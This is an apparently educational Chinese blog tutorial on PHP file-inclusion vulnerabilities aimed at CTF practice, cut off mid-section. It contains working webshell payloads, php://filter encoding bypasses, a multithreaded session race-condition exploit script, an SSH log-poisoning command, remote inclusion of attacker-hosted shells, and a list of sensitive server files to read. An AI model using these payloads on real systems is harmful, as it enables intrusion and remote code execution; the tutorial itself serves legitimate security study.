# PHP安全学习—文件包含漏洞

Author: H3rmesk1t

Data: 2021.05.28

# 什么是文件包含

为了更好地使用代码的重用性，引入了文件包含函数，通过文件包含函数将文件包含进来，直接使用包含文件的代码，简单点来说就是一个文件里面包含另外一个或多个文件

# 文件包含漏洞成因

文件包含函数加载的参数没有经过过滤或者严格的定义，可以被用户控制，包含其他恶意文件，导致了执行了非预期的代码
例如：`$_GET['filename']`没有经过严格的过滤，直接带入了include的函数，便可以修改`$_GET['filename']`的值，执行非预期的操作

```php
<?php
    $filename  = $_GET['filename'];
    include($filename);
?>
```

# php引发文件包含漏洞的四个函数

- include()
- include_once()
- require()
- require_once()

>include()和require()的区别：
require()如果在包含过程中出错，就会直接退出，不执行后续语句
require()如果在包含过程中出错，只会提出警告，但不影响后续语句的执行

# 文件包含漏洞的类型

当包含文件在服务器本地上，就形成本地文件包含；当包含的文件在第三方服务器是，就形成可远程文件包含
## 本地文件包含
### 无任何限制

```php
<?php
show_source(__FILE__);
if(isset($_GET['file'])){
    $file = $_GET['file'];
    include($file);
}else{
    echo "Can you find me???";
}
?>
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/2021052715133591.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210527151346429.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

由于没有任何限制所以可以通过目录遍历漏洞来获取到系统中的其他内容，因为考察文件包含经常是结合任意文件读取漏洞的，所以就总结一些Liunx环境下文件常见读取路径

```php
/etc/apache2/*
#Apache配置文件，可以获知Web目录、服务端口等信息
/etc/nginx/*
#Nginx配置文件，可以获知Web目录、服务端口等信息
/etc/crontab
#定时任务文件
/etc/environment
#环境变量配置文件之一。环境变量可能存在大量目录信息的泄露，甚至可能出现secret key泄露的情况
/etc/hostname
#主机名
/etc/hosts
#主机名查询静态表，包含指定域名解析IP的成对信息。通过这个文件，可以探测网卡信息和内网IP/域名
/etc/issue
#系统版本信息
/etc/mysql/*
#mysql配置文件
/etc/my.cnf
#mysql配置文件
/etc/mysql/my.cnf   
#MYSQL配置文件
/etc/php/*
#PHP配置文件
/proc 目录
#/proc目录通常存储着进程动态运行的各种信息，本质上是一种虚拟目录，如果查看非当前进程的信息，pid是可以进行暴力破解的，如果要查看当前进程，只需/proc/self代替/proc/[pid]即可
/proc/[pid]/cmdline
#cmdline可读出比较敏感的信息
# ssh日志，攻击方法：
ssh `<?php phpinfo(); ?>`@192.168.1.1
/var/log/auth.log
# apache日志
/var/log/apache2/[access.log|error.log]
#apache配置文件（ubuntu）
/etc/apache2/apache2.conf      
#apache配置文件（centos）
/etc/httpd/conf/httpd.conf     
```
### 限制包含文件的后缀名

```php
<?php
highlight_file(__FILE__);
if(isset($_GET['file'])){
    $file = $_GET['file'];
    include($file . ".H3rmesk1t");
}else{
    echo "Cam you find me???"
}
?>
```

**第一种方法：%00截断**
- 前提：PHP<5.3.4
- magic_quotes_gpc = Off

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210527153839668.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

![在这里插入图片描述](https://img-blog.csdnimg.cn/2021052715384856.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

第二种方法：长度截断
- 前提：PHP版本<=5.2.?
- 操作系统对于目录字符串存在长度限制：Windows下目录最大长度为256字节，超出的部分会被丢弃掉；Linux下目录最大长度为4096字节，超出的部分会被丢弃掉；例如，windows操作系统，`.`超过256个字节即可，Linux下只需不断重复`./`即可

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210527154820642.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

**第三种方法：zip/phar协议**

```php
<?php
highlight_file(__FILE__);
if(isset($_GET['file'])){
    $file = $_GET['file'];
    include($file.".jpg");
}else{
    echo "Can you find me???"
}
?>
```
很明显看出来这是个文件包含，但是将传递的文件名后面强制加了一个".jpg"的后缀，导致了无法任意文件包含
首先我们新建一个shell.php文件，内容如下：

```php
<?php phpinfo();?>
```

- 并将其改名为test.jpg，因为上面的代码只能包含 jpg 文件嘛
- 然后将其压缩成zip包，压缩的时候注意要选择only store之类的选项，防止数据被压缩
- 然后将这个 zip 的后缀改为 jpg 之类的(有时不改直接用zip后缀也可以成功)，目的是可以成功上传，之后我们就可以通过：`http://localhost/H3rmesk1t/demo.php?file=zip://D:/Users/86138/Desktop/shell.zip%23shell`或者`http://localhost/H3rmesk1t/demo.php?file=zip://D:/Users/86138/Desktop/shell.jpg%23shell`或者`http://localhost/H3rmesk1t/demo.php?file=phar://D:/Users/86138/Desktop/shell.zip/shell`或者`http://localhost/H3rmesk1t/demo.php?file=phar://D:/Users/86138/Desktop/shell.jpg/shell`

![在这里插入图片描述](https://img-blog.csdnimg.cn/2021052716515172.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210527165359687.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210527165519527.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
![在这里插入图片描述](https://img-blog.csdnimg.cn/2021052716553289.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

- zip://文件路径/zip文件名称#压缩包内的文件名称 （使用时注意将#号进行URL编码）
- phar://文件路径/phar文件名称/phar内的文件名称
- phar://协议与zip://类似，同样可以访问zip格式压缩包内容
### Session文件包含漏洞

- 前提条件：PHP版本>5.4.0
- 配置项：session.upload_progress.enabled的值为On
- 利用session.upload_progress进行文件包含,在php5.4之后添加了这个功能
```php
（由于我是在Windows环境下做的测试就把限制条件去掉了）
<?php
highlight_file(__FILE__);
if(isset($_GET['file'])){
	$file = $_GET['file'];
	// $file = str_replace("php", "xxx", $file);
	// $file = str_replace("data", "xxx", $file);
	// $file = str_replace(":", "xxx", $file);
	// $file = str_replace(".", "xxx", $file);
	include($file);
}else{
	echo "Can you find me???";
}
?>
```
几个php.ini的默认选项：
```h
session.upload_progress.enabled = on
# 表示upload_progress功能开始，即当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中
session.upload_progress.cleanup = on
# 表示当文件上传结束后，php将会立即清空对应session文件中的内容
session.upload_progress.prefix = "upload_progress_"
session.upload_progress.name = "PHP_SESSION_UPLOAD_PROGRESS"
# 表示为session中的键名
session.use_strict_mode=off
# 表示对Cookie中sessionid可控
```
例如：在`session.upload_progress.name='PHP_SESSION_UPLOAD_PROGRESS'`的条件下上传文件，便会在`session['upload_progress_D1no']`中储存一些本次上传相关的信息，储存在`/tmp/sess_H3rmesk1t`

```html
// PHPSESSION = H3rmesk1t
<form action="upload.php" method="POST" enctype="multipart/form-data">
 <input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="D1no" />
 <input type="file" name="file1" />
 <input type="file" name="file2" />
 <input type="submit" />
</form>
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210527171251145.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

通过上图和几个默认选项的有关介绍就想是否可以利用session.upload_progress来写入恶意语句，然后进行包含文件，但前提是需要知道session的存储位置

PHP中session的存储机制：
- php中的session中的内容并不是存储在内存中，而是以文件的方式进行存储，存储方式是由配置项`session.save_handler`来进行确定的，默认便是以文件的方式进行存储，存储文件的名字便是由`sess_sessionid`来进行命名的，文件的内容便是session值序列化之后的内容，至于存储路径便是由配置项`session.save_path`来进行决定的

>一般session的存储路径都不会怎么去改，默认的便是：
- linux：/tmp 或 /var/lib/php/session
- Windows：C:\WINDOWS\Temp

>存储路径知道了，但是由于代码中没有session_start()函数，无法创建出session文件；其实如果配置项session.auto_start=On 是打开的，那么PHP在接收请求的时候便会自动化Session，不再需要执行该函数，但默认都是关闭的；在session中还有一个默认选项，便是上面提到的session.use_strict_mode默认值是0，用户可以自己定义SessionID

```php
Cookie中设置：
PHPSESSID = H3rmesk1t
PHP便会在服务器上创建一个文件(默认路径)
/tmp/sess_H3rmesk1t

即使此时用户没有初始化Session，PHP也会自动初始化Session
并产生一个键值，这个键值由ini.get("session.upload_progress.prefix")+我们构造的session.upload_progress.name值组成，最后被写入sess_文件里
```

还有一个问题没有解决，默认配置session.upload_progress.cleanup = on导致文件上传后，session文件内容会立即被清空，所以这里就需要去使用多线程同时进行写和读，进行条件竞争，在session文件清除前进行包含利用

```python
import requests
import io
import threading

url = 'http://xxx.xxx.xx.xx:80/H3rmesk1t/demo.php'
sessID = 'H3rmesk1t'

def write(session):
    #判断event的标志是否为True
    while event.isSet():
        #上传文件要大一点,更有利于条件竞争
        f = io.BytesIO(b'H3rmesk1t' * 1024 * 50)
        reponse = session.post(
            url,
            cookies={'PHPSESSID': sessID},
            data={'PHP_SESSION_UPLOAD_PROGRESS':'<?php system("cat flag");?>'},
            files={'file':('text.txt',f)}
        )
def read(session):
    while event.isSet():
        reponse = session.get(url + '?file=/phpstudy/phpstudy_x64/phpstudy_pro/Extensions/tmp/sess_{}'.format(sessID))
        if 'D1no' in reponse.text:
            print(reponse.text)
            #将event的标志设置为False，调用wait方法的所有线程将被阻塞；
            event.clear()
        else:
            print('[*]continued')

if __name__ == '__main__':
    #通过threading.Event()可以创建一个事件管理标志，该标志（event）默认为False
    event = threading.Event()
    #将event的标志设置为True，调用wait方法的所有线程将被唤醒；
    event.set()
    #会话机制(Session）在PHP 中用于保持用户连续访问Web应用时的相关数据
    with requests.session() as session:
        for i in range(1,30):
            threading.Thread(target=write, args=(session,)).start()
        for i in range(1,30):
            threading.Thread(target=read, args=(session,)).start()
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210527175151787.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

这样就可以得到flag了,除此之外，还可以使用burp来进行条件竞争，例如利用下面的html上传代码上传一个文件

```html
<!DOCTYPE html>
<html>
<body>
<form action="http://localhost/H3rmesk1t/demo.php" method="POST" enctype="multipart/form-data">
<input type="hidden" name="PHP_SESSION_UPLOAD_PROGRESS" value="H3rmesk1t" />
<input type="file" name="file" />
<input type="submit" value="submit" />
</form>
</body>
</html>
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210527210427952.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

再根据代码抓一个get的包，请求/tmp/sess_flag

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210527210518638.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

同时进行爆破，payload设置成null payloads就可以一直爆破

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210527210557830.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
## 远程包含

利用前提：
- allow_url_fopen = On 是否允许打开远程文件
- allow_url_include = On 是否允许include/require远程文件

### 无任何限制

代码没有任何限制，直接在公网上存放恶意webshell即可，然后通过包含即可执行恶意payload
`?filename=http://xxxx/php.txt`

### 限制包含文件的后缀名

例如：`<?php include($_GET['filename'] . ".no"); ?>`


- 第一种方法：?绕过    `?filename=http://xxxx/php.txt?`
- 第二种方法：#绕过    `?filename=http://xxxx/php.txt%23`

# PHP伪协议

简单理解便是PHP自己提供的一套协议，可以适用于自己的语言，其他语言则不适用，这便是伪协议，与之相对的例如HTTP\HTTPS便不是伪协议，因为大部分系统\软件都能够进行识别

## 常见的伪协议

可以看下之间[详解PHP伪协议](https://blog.csdn.net/LYJ20010728/article/details/110312276)的内容
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210527211634446.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
如果遇到的环境有写入权限，可以使用php://input伪协议来写入木马

```php
POST DATA
<?php fputs(fopen('H3rmesk1t.php','w'),'<?php @eval($_GET[cmd]); ?>'); ?>
```
## php://filter各种过滤器

php://filter是一种元封装器，设计用来数据流打开时筛选过滤应用，详见[官方文档](https://www.php.net/manual/zh/wrappers.php.php)

对于php://来说，是支持多种过滤器嵌套的，格式如下：

```p
php://filter/[read|write]=[过滤器1]|[过滤器2]/resource=文件名称（包含后缀名）
# 如果|被过滤掉了，可以使用多过滤器:

php://filter/string.rot13/resource=php://filter/convert.base64-encode/resource=文件名称（包含后缀名）
# 嵌套过程的执行流程为从左到右

其实是可以简写成这样的php://filter/[过滤器] ，php会自己进行识别
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210527212439780.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
## 过滤器列表
| 过滤器名称|说明 | 类别	| 版本 |
|---|---|---|---|
string.rot13	|rot13转换|	字符串过滤器|	PHP>4.3.0
string.toupper、string.tolower|	大小写互转	|字符串过滤器	|PHP>5.0.0
string.strip_tags|	去除`<?(.*?)?>`的内容|	string.strip_tags|	PHP<7.3.0
convert.base64-encode、convert.base64-decode	|base64编码转换|	转换过滤器|	PHP>5.0.0
convert.quoted-printable-encode、convert.quoted-printable-decode|	URL编码转换	|转换过滤器	|PHP>5.0.0
convert.iconv.编码1.编码2|	任意编码转换|	转换过滤器	|PHP>5.0.0
zlib.deflate、zlib.inflate|	zlib压缩	|压缩过滤器	|PHP>5.1.0
bzip2.compress、bzip2.decompress|	zlib压缩|	压缩过滤器	|PHP>5.1.0

从上面的过滤器列表中便会发现，php伪协议主要支持以下几类：
>1. 字符串过滤器
>2. string.strip_tags
>3. 转换过滤器
>4. 压缩过滤器
>5. 加密过滤器

## PHP伪协议常用函数

**注意show_source有回显，而file_get_contents是没有回显的**
- file_get_contents
- file_put_contents
- readfile
- fopen
- file
- show_source
- highlight_file
## file_put_content与死亡/杂糅代码
CTF经常类似考察这样的代码：
- `file_put_contents($filename,"<?php exit();".$content);`
- `file_put_contents($content,"<?php exit();".$content);`
- `file_put_contents($filename,$content . "\nxxxxxx");`

>这种代码非常常见，在$content开头增加了exit进程，即使写入一句话也无法执行，遇到这种问题一般的解决方法便是利用伪协议`php://filter`，结合编码或相应的过滤器进行绕过；绕过原理便是将死亡或者杂糅代码分解成为php无法进行识别的代码

### 第一种情况

```php
<?php
if(isset($_GET['file'])){
    $file = $_GET['file'];
    $content = $_POST['content'];
    file_put_contents($file,"<?php exit();".$content);
}else{
    highlight_file(__FILE__);
}
```

**base64编码绕过：**
- 上面提到了绕过原理便是将死亡或者杂糅代码分解成为php无法进行识别的代码
- 使用base64编码，是因为base64只能打印64 (a-z0-9A-Z) 个可打印字符，PHP在解码base64时如果遇到了不在其中的字符，便会跳过这些字符，然后将合法字符组成一个新的字符串再进行解码
- 当$content被加上了`<?php exit; ?>`以后，可以使用`php://filter/convert.base64-decode`来对其解码，在解码的过程中，字符`<?;空格`等不符合base64编码的字符范围将会被忽略，所以最终被解码的字符只有phpexit和传入的其他字符
- 但是还要知道的是base64解码时是4个byte一组，上面正常解码的只有7个字符，所以再手动加上去1个字符a，凑齐8个字符

```php
Payload：

?file=php://filter/convert.base64-decode/resource=H3rmesk1t.php
POST DATA
content=aPD9waHAgcGhwaW5mbygpOyA/Pg==
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210527222810905.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

**rot13编码绕过：**
利用rot13编码其实和base64编码绕过原理一样，只要成为php无法进行识别的代码，就不会执行
 前提是PHP没有开启short_open_tag(短标签)，默认情况下是没有开启的

![在这里插入图片描述](https://img-blog.csdnimg.cn/2021052722422210.png#pic_center)

```php
Payload：

<?php
$s = '<?php @eval($_GET[cmd]); ?>';
echo str_rot13($s)
?>
=>
<?cuc @riny($_TRG[pzq]); ?>

?file=php://filter/write=string.rot13/resource=test1.php
POST DATA
content=<?cuc @riny($_TRG[pzq]); ?>
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210527224411264.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
**嵌套绕过：**
strip_tags() 函数剥去字符串中的 HTML、XML 以及 PHP 的标签（php7.3之后移除）

>`string.strip_tags`可以去除剥去字符串中的 HTML、XML 以及 PHP 的标签，而`<?php exit; ?>`实际上便是一个XML标签，既然是XML标签，就可以利用strip_tags函数去除它，所以可以先将webshell用base64编码，调用完成strip_tags后再进行base64-decode，死亡exit在第一步被去除，而webshell在第二步被还原

```php
Payload：

#php5
?file=php://filter/string.strip_tags|convert.base64-decode/resource=test2.php
POST DATA
content=?>PD9waHAgcGhwaW5mbygpOyA/Pg==
#由于<?php exit();不是完整的标签，所以需要加上?>进行补全
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210527234732519.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

但是这种方法有局限性，因为string.strip_tags在php7.3以上的环境下会发生段错误，从而导致无法写入，在php5或者php7.2的环境下则不受此影响

**过滤器嵌套：**
如果环境是php7的话，也可以使用过滤器嵌套的方法来做
流程是先将三个过滤器叠加之后进行压缩，然后转小写，最后再解压，这样的流程执行结束后会导致部分死亡代码错误，便可以写进去我们想要写入的shell，原理很简单，就是利用过滤器嵌套的方式让死亡代码在各种变换之间进行分解扰乱，最终变成php无法识别的字符

```php
经测试可用的Payload：

?file=php://filter/zlib.deflate|string.tolower|zlib.inflate|/resource=a.php
POST DATA
content=php://filter/zlib.deflate|string.tolower|zlib.inflate|?><?php%0deval($_GET[cmd]);?>/resource=a.php
或者(没试过)
content=php/:|<?php%0Dphpinfo();?>/resource=test3.php
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210528000436209.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
**.htaccess的预包含利用：**
.htaccess是一个纯文本文件，里面存放着Apache服务器配置相关的一些指令，它类似于Apache的站点配置文件，但只作用于当前目录，而且是只有用户访问目录时才加载，通过该文件可以实现网页301重定向，自定义404错误页面，改变文件拓展名，禁止目录列表等
通过 php_value 来设置 auto_prepend_file或者 auto_append_file 配置选项包含一些敏感文件，同时在本目录或子目录中需要有可解析的 php 文件来触发，这时无论访问那个文件，都会解析出flag.php
`php_value auto_prepend_file +文件绝对路径（默认为当前上传的目录）`

```php
Payload：

?file=php://filter/write=string.strip_tags/resource=.htaccess
POST DATA
content=?>php_value%20auto_prepend_file%20D:\phpstudy\phpstudy_x64\phpstudy_pro\WWW\H3rmesk1t\flag.php
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210528013348907.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

### 第二种情况

```php
<?php
if(isset($_GET['content'])){
    $content = $_GET['content'];
    file_put_contents($content,"<?php exit();".$content);
}else{
    highlight_file(__FILE__);
}
```

这种情况和上面第一种便有点不同了，因为是一个变量，但还是可以利用php伪协议进行嵌套过滤器来消除死亡代码的，可以利用.htaccess进行预包含，然后读取flag

**.htaccess预包含绕过：**
可以直接自定义预包含文件，这里直接包含了.htaccess导致了所有文件都包含flag.php文件
这里我本机测试时无法执行.htaccess，借用了一下别人的图 (还是太菜了~~)


```php
payload：

?content=php://filter/string.strip_tags/?>php_value auto_prepend_file D:\flag.php%0a%23/resource=.htaccess
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210528013232306.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

**base64编码绕过：**
 - 既然变成了一个变量，那么首先想到的payload便是：`php://filter/convert.base64-decode/PD9waHAgcGhwaW5mbygpOz8+/resource=H3rmesk1t.php`但是有一个问题，可以创建文件，但是无法写入内容，原因出在=号上，因为默认情况下base64编码是以=作为结尾的，在正常解码的时候到了=就解码结束了，在最后获取文件名的时候因为resource=中含有等号，所以以为解码是结束了，导致过滤器解码失败，从而报错，内容由于解码过程出错了，所以就都丢弃了
 - 所以现在问题就转变为了只要能去掉这个等号，就可以将内容写进去，可以看下这种方法：`php://filter/<?|string.strip_tags|convert.base64-decode/resource=?>PD9waHAgcGhwaW5mbygpOz8%2B.php`如果按照之前的思路是先闭合死亡代码，然后再使用过滤器去除html标签，最后再进行解码，但仔细观察这个payload并非是那种解法，而是直接在内容时，就将我们base64遇到的等号这个问题直接写在<? ?>中进行过滤掉，然后base64-decode再对原本内容的<?php exit();进行转码，从而达到分解死亡代码的目的
 - 除此之外还可以使用之前的思路来做，既然base64编码写在里面不行，那么就直接放在外面，然后搭配一下过滤器`php://filter/string.strip.tags|convert.base64-decode/resource=?>PD9waHAgcGhwaW5mbygpOz8%2B.php`先闭合死亡代码，然后进行解码，这样便可以写入到文件中去，但访问的话会出现问题，查看s1mple师傅的方法，发现可以通过使用伪目录的方法，从而绕过去`php://filter/write=string.strip_tags|convert.base64-decode/resource=?>PD9waHAgcGhwaW5mbygpOz8%2B/../H3rmesk1t.php`将前面的一串base64字符和闭合的符号整体看作一个目录，虽然没有，但是后面重新撤回了原目录，生成H3rmesk1t.php文件；从而就可以生成正常的文件名，上面的那种方法也可以使用这种伪目录的方法解决访问问题

**rot13编码绕过：**
rot13则无需考虑=号问题

```php
Payload：

?content=php://filter/string.rot13/<?cuc cucvasb();?>/resource=1.php
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210528003428286.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

**iconv字符编码绕过：**
在php中iconv函数库能够完成各种字符集间的转换
在该函数库下有一个`convert.iconv.`这样的过滤器，这个过滤器需要php支持iconv，而iconv是默认编译的，使用`convert.iconv.*`过滤器等同于用iconv()函数处理所有的流数据

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210528003937955.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

利用方式就是用此过滤器，从而进行编码的转换，转换掉死亡代码，写入自己的shell，首先先要了解一下UCS的两种编码格式UCS-2和UCS-4：
- UCS-2就是用两个字节编码
- UCS-4就是用四个字节编码

来看一下利用这个函数即不同的格式转换后的结果：
第二个之所以要加上两个字符，是因为UCS-4对目标字符串是4位一反转，所以要注意这里的恶意代码要是4的倍数，所以这里需要补上两个字符
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210528004353240.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

**UCS-2利用：**
对目标字符串进行2位一反转
(一定要计算好长度，写入php文件中的内容在`?<hp phpipfn(o;)>?`之前的一定要是2的倍数，就像下面的Payload前面的是57个字符，加了一个?凑成58字符，做题时可以通过本地测试Payload，成功后再利用)

```php
Payload：

?content=php://filter//convert.iconv.UCS-2LE.UCS-2BE|??<hp phpipfn(o;)>?/resource=22.php
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210528005559849.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
**UCS-4的利用：**
对目标字符串进行4位一反转，一定要拼凑够4的倍数(构造道理同UCS-2)

```php
Payload：

?content=php://filter//convert.iconv.UCS-4LE.UCS-4BE|aaa?<ba phpiphp(ofn>?;)/resource=33.php
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210528010720688.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
**组合拳UTF-8/UTF-7：**
上面的这种base64编码`php://filter/convert.base64-decode/PD9waHAgcGhwaW5mbygpOz8+/resource=H3rmesk1t.php`，之所以payload无法执行是因为受到了等号的影响，但是通过测试发现可以利用UTF-8和UTF-7间的转换了来绕过等号，再解码时发现=没有转换回来

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210528011231613.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)

所以可以利用这种特性来嵌套过滤器，从而绕过等号

```php
Payload：

php://filter/write=PD9waHAgcGhwaW5mbygpOz8+|convert.iconv.utf-8.utf-7|convert.base64-decode/resource=H3rmesk1t.php

经过测试发现，write=一定要写进去，如果不写PHP不会去自动识别，同时内容要写在前面，如果写在后面内容写会写入，但是解析不了，如：
php://filter/write=convert.iconv.utf-8.utf-7|convert.base64-decode/PD9waHAgcGhwaW5mbygpOz8+/resource=H3rmesk1t.php
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210528011717550.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
**UCS2/ROT13、UCS4/ROT13：**
这里在自己测试的发现，使用UCS2或UCS4进行编码时，这个过程是识别空格的，但是到使用伪协议的时候需要进行反转解码，又无法识别空格，这就是为什么下面的payload要多加一个字符

```php
Payload：

?content=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE|string.rot13|x?<uc cucvcsa(b;)>?/resource=shell.php
# 注意这里要补充一个字符，因为空格无法和任意一个字符搭配进行反转
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/20210528012033631.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
**UCS4/ROT13：**

```php
?content=php://filter/write=convert.iconv.UCS-4LE.UCS-4BE|string.rot13|x?<xx cucvcuc(bsa>?;)/resource=shell1.php
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/20210528012805901.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0xZSjIwMDEwNzI4,size_16,color_FFFFFF,t_70#pic_center)
### 第三种情况

```php
<?php
if(isset($_GET['content'])){
